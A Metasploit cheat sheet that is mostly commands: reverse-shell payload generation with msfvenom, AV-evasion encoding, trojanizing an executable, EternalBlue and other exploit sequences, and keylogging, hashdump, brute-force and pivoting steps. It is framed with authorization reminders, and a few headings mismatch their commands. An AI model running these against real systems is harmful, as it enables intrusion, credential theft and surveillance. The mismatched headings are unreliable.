# Metasploit Framework Cheat Sheet

## Overview

The Metasploit Framework is an open-source penetration testing platform used to:

- Discover services.
- Validate vulnerabilities.
- Develop and test exploits.
- Perform post-exploitation activities.
- Conduct authorized security assessments.

Metasploit provides:

- A large database of exploits.
- Payload generators.
- Post-exploitation modules.
- Auxiliary modules for scanning and enumeration.
- Integration with other tools.

```text
Use Metasploit only against systems you own or are explicitly authorized to test.
```

---

# 1. Starting Metasploit

## Start the Metasploit console

```bash
msfconsole
```

This launches the interactive Metasploit command-line interface.

## Start Metasploit and connect to an existing database

```bash
msfconsole
```

Metasploit automatically connects to the PostgreSQL database if it is running.

## Check database status

From within `msfconsole`:

```bash
db_status
```

## Start the database service (if not running)

On many systems:

```bash
sudo systemctl start postgresql
sudo msfdb init
```

Then restart `msfconsole`.

## Show help

```bash
help
```

## Exit Metasploit

```bash
exit
```

or

```bash
quit
```

---

# 2. Workspace Management

Workspaces help you organize multiple engagements.

## List workspaces

```bash
workspace
```

## Create a new workspace

```bash
workspace -a engagement_name
```

## Switch to a workspace

```bash
workspace engagement_name
```

## Delete a workspace

```bash
workspace -d engagement_name
```

## Rename a workspace

```bash
workspace -r old_name new_name
```

## Show current workspace

```bash
workspace
```

---

# 3. Searching for Modules

Metasploit modules are organized into categories:

- `exploit`
- `payload`
- `auxiliary`
- `post`
- `encoder`
- `evasion`
- `nops`

## Search by keyword

```bash
search keyword
```

Example:

```bash
search smb
```

## Search by module type

```bash
search type:exploit smb
```

## Search by platform

```bash
search platform:windows
```

## Search by CVE

```bash
search cve:2017-0144
```

## Search by port

```bash
search port:445
```

## Search by rank

Ranks indicate reliability and safety:

- `manual`
- `low`
- `normal`
- `good`
- `great`
- `excellent`

```bash
search rank:excellent
```

## Combine search filters

```bash
search type:exploit platform:windows port:445 rank:great
```

## Show detailed information about a module

```bash
info exploit/windows/smb/ms17_010_eternalblue
```

---

# 4. Using Modules

## Select a module

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Show module options

```bash
show options
```

## Show advanced options

```bash
show advanced
```

## Show evasion options

```bash
show evasion
```

## Set an option

```bash
set RHOSTS <target-IP>
```

## Set multiple targets

```bash
set RHOSTS 192.168.1.10,192.168.1.20
```

## Set a range of targets

```bash
set RHOSTS 192.168.1.10-20
```

## Set a subnet

```bash
set RHOSTS 192.168.1.0/24
```

## Set the local interface

```bash
set LHOST 192.168.1.5
```

## Set the listening port

```bash
set LPORT 4444
```

## Set a payload for the current exploit

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Reset an option to default

```bash
unset RHOSTS
```

## Reset all options

```bash
unset *
```

## Run the module

```bash
run
```

or for exploits:

```bash
exploit
```

## Run the module in the background

```bash
run -j
```

or

```bash
exploit -j
```

## Show sessions

```bash
sessions
```

## Interact with a session

```bash
sessions -i 1
```

## Kill a session

```bash
sessions -k 1
```

## Kill all sessions

```bash
sessions -K
```

---

# 5. Payloads

## List available payloads

```bash
show payloads
```

## Generate a payload with msfvenom

Outside `msfconsole`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

## Generate a Linux payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

## Generate a PHP payload

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.php
```

## Generate a Python payload

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

## Generate a PowerShell payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f powershell -o payload.ps1
```

## Generate a shellcode in hex

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f c
```

## Encode a payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## List encoders

```bash
msfvenom --list encoders
```

## List available formats

```bash
msfvenom --list formats
```

## Generate a staged vs stageless payload

Staged (smaller initial payload, downloads additional stages):

```bash
windows/meterpreter/reverse_tcp
```

Stageless (larger, self-contained):

```bash
windows/meterpreter_reverse_tcp
```

---

# 6. Auxiliary Modules

Auxiliary modules are used for scanning, enumeration, fuzzing, and other non-exploitation tasks.

## Search auxiliary modules

```bash
search type:auxiliary smb
```

## Use an auxiliary scanner

```bash
use auxiliary/scanner/smb/smb_version
```

## Set target

```bash
set RHOSTS <target-IP>
```

## Run the scanner

```bash
run
```

## Common auxiliary scanners

### SMB version detection

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-IP>
run
```

### SMB share enumeration

```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <target-IP>
run
```

### SSH enumeration

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target-IP>
run
```

### HTTP directory scanner

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

### HTTP version detection

```bash
use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run
```

### Port scanner (TCP)

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <target-IP>
run
```

### FTP anonymous login check

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS <target-IP>
run
```

### MySQL login enumeration

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-IP>
run
```

### RDP detection

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS <target-IP>
run
```

---

# 7. Exploitation Workflow

## Step 1: Search for an exploit

```bash
search ms17-010
```

## Step 2: Select the exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Step 3: Show options

```bash
show options
```

## Step 4: Set the target

```bash
set RHOSTS <target-IP>
```

## Step 5: Set the payload

```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

## Step 6: Set local IP and port

```bash
set LHOST 192.168.1.5
set LPORT 4444
```

## Step 7: Check if the target is vulnerable (if supported)

```bash
check
```

Not all modules support the `check` command.

## Step 8: Run the exploit

```bash
exploit
```

## Step 9: Interact with the session

```bash
sessions -i 1
```

---

# 8. Post-Exploitation with Meterpreter

Once you have a Meterpreter session:

## Show help

```bash
help
```

## Show system information

```bash
sysinfo
```

## Show current user

```bash
getuid
```

## Show processes

```bash
ps
```

## Migrate to another process

```bash
migrate <pid>
```

## Upload a file

```bash
upload local_path remote_path
```

## Download a file

```bash
download remote_path local_path
```

## Take a screenshot

```bash
screenshot
```

## Record the webcam

```bash
record_mic
```

## Keylogging

```bash
keyscan_start
keyscan_dump
keyscan_stop
```

## Hashdump (requires privileges)

```bash
run post/windows/gather/hashdump
```

## Enumerate local users

```bash
run post/windows/gather/enum_users
```

## Enumerate installed applications

```bash
run post/windows/gather/enum_applications
```

## Enumerate Chrome data

```bash
run post/windows/gather/enum_chrome
```

## Search for files

```bash
search -f *.txt
```

## Search for specific files

```bash
search -f password
```

## Execute a command

```bash
shell
```

Return to Meterpreter:

```bash
exit
```

## Execute a single command

```bash
execute -f cmd.exe -i
```

## Migrate session to a more stable process

```bash
migrate <pid>
```

## Background the session

Press `Ctrl+Z` and confirm with `y`.

## List all sessions

```bash
sessions
```

## Interact with a specific session

```bash
sessions -i <id>
```

## Kill a session

```bash
sessions -k <id>
```

---

# 9. Pivoting and Port Forwarding

## Add a route through a compromised host

From `msfconsole`:

```bash
route add 10.10.10.0/24 1
```

Where `1` is the session ID.

## Show routes

```bash
route print
```

## Remove a route

```bash
route delete 10.10.10.0/24
```

## Use a route with a module

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.20
set SESSION 1
run
```

## Port forwarding

Forward a remote port to your local machine:

```bash
portfwd add -l 8080 -p 80 -r 10.10.10.20 -s 1
```

This forwards:

- Local port `8080`
- To remote port `80` on `10.10.10.20`
- Through session `1`

Access via:

```text
http://127.0.0.1:8080
```

## Remove port forwarding

```bash
portfwd delete -l 8080
```

---

# 10. Database Integration

## Show all hosts

```bash
hosts
```

## Show all services

```bash
services
```

## Show services for a specific host

```bash
services -H <target-IP>
```

## Show vulnerable services

```bash
services -p 445
```

## Import Nmap results

```bash
db_import scan.xml
```

Supported formats include:

- Nmap XML.
- Nessus.
- Burp.
- Others.

## Export database data

```bash
db_export /path/to/export
```

## Clear database

```bash
db_removeall
```

Use with caution.

---

# 11. Resource Scripts and Automation

## Run a resource script

```bash
resource /path/to/script.rc
```

## Create a simple resource script

Example `auto_exploit.rc`:

```text
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit -j
```

Run it:

```bash
resource auto_exploit.rc
```

## Log all commands and output

```bash
spool /path/to/logfile.txt
```

Stop logging:

```bash
spool off
```

---

# 12. Encoding and Evasion

## List available encoders

```bash
msfvenom --list encoders
```

## Encode a payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
```

## Generate a payload with multiple encodings

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o multi_encoded.exe
```

## Use custom templates

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x original.exe -f exe -o trojan.exe
```

This embeds the payload into an existing executable.

## List available formats

```bash
msfvenom --list formats
```

---

# 13. Common Exploits and Scenarios

## SMB EternalBlue (MS17-010)

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## MS08-067 (NetAPI)

```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target-IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## Apache Struts RCE

```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target-IP>
set RPORT 8080
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

## SSH Brute Force

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-IP>
set USERNAME root
set PASS_FILE /path/to/passwords.txt
run
```

## FTP Brute Force

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target-IP>
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
run
```

## HTTP Directory Bruteforce

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run
```

## VNC Scanner

```bash
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target-IP>
run
```

---

# 14. Meterpreter Post Modules

## Migrate to a stable process

```bash
migrate <pid>
```

## Get system information

```bash
sysinfo
```

## Get user ID

```bash
getuid
```

## Check if running in a VM

```bash
run post/windows/gather/enum_vmware
```

## Enumerate local users

```bash
run post/windows/gather/enum_users
```

## Enumerate installed software

```bash
run post/windows/gather/enum_applications
```

## Dump hashes

```bash
run post/windows/gather/hashdump
```

## Enumerate Chrome

```bash
run post/windows/gather/enum_chrome
```

## Enumerate Firefox

```bash
run post/windows/gather/enum_firefox
```

## Search for interesting files

```bash
search -f *.docx
search -f *.pdf
search -f password
```

## Upload a file

```bash
upload /local/path/file.txt C:\\temp\\file.txt
```

## Download a file

```bash
download C:\\temp\\file.txt /local/path/
```

## Execute a command

```bash
shell
```

Return to Meterpreter:

```bash
exit
```

## Execute a single command

```bash
execute -f cmd.exe -i
```

## Kill a process

```bash
kill <pid>
```

## Reboot the system

```bash
reboot
```

## Shutdown the system

```bash
shutdown
```

---

# 15. Practical Workflows

## Basic exploitation workflow

```text
1. Search for an exploit.
2. Select the exploit.
3. Show options.
4. Set RHOSTS, LHOST, LPORT.
5. Set the payload.
6. Run check (if available).
7. Exploit.
8. Interact with the session.
9. Perform post-exploitation.
10. Document findings.
```

## Example: Full workflow

```bash
# Start Metasploit
msfconsole

# Search
search ms17-010

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS <target-IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Check
check

# Exploit
exploit

# Interact
sessions -i 1

# Post-exploitation
sysinfo
getuid
run post/windows/gather/hashdump
```

## Web application enumeration

```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/http_version
set RHOSTS <target-IP>
run

use auxiliary/scanner/http/title
set RHOSTS <target-IP>
run
```

## Network enumeration

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.0/24
run
```

---

# 16. Common Commands Reference

| Command | Description |
|---|---|
| `msfconsole` | Start the Metasploit console |
| `workspace` | Manage workspaces |
| `search` | Search for modules |
| `use` | Select a module |
| `show options` | Display module options |
| `set` | Set an option |
| `unset` | Reset an option |
| `run` / `exploit` | Execute a module |
| `check` | Test if a target is vulnerable |
| `sessions` | List sessions |
| `sessions -i` | Interact with a session |
| `background` | Background the current session |
| `exit` / `quit` | Exit Metasploit |
| `spool` | Log commands and output |
| `resource` | Run a resource script |
| `db_import` | Import scan results |
| `hosts` | List hosts in the database |
| `services` | List services in the database |
| `route` | Manage routing through compromised hosts |
| `portfwd` | Configure port forwarding |
| `msfvenom` | Generate payloads |
| `help` | Show help |

---

# 17. Important Reminders

- Always obtain explicit authorization before using Metasploit.
- Test exploits in a controlled lab environment first.
- Not all exploits are reliable; check the rank.
- Some modules may crash services or systems.
- Keep Metasploit updated regularly.
- Validate findings manually; do not rely solely on automated results.
- Document all actions, commands, and results.
- Preserve original evidence and logs.
- Respect the scope and rules of engagement.
- Understand the legal and ethical implications of your actions.

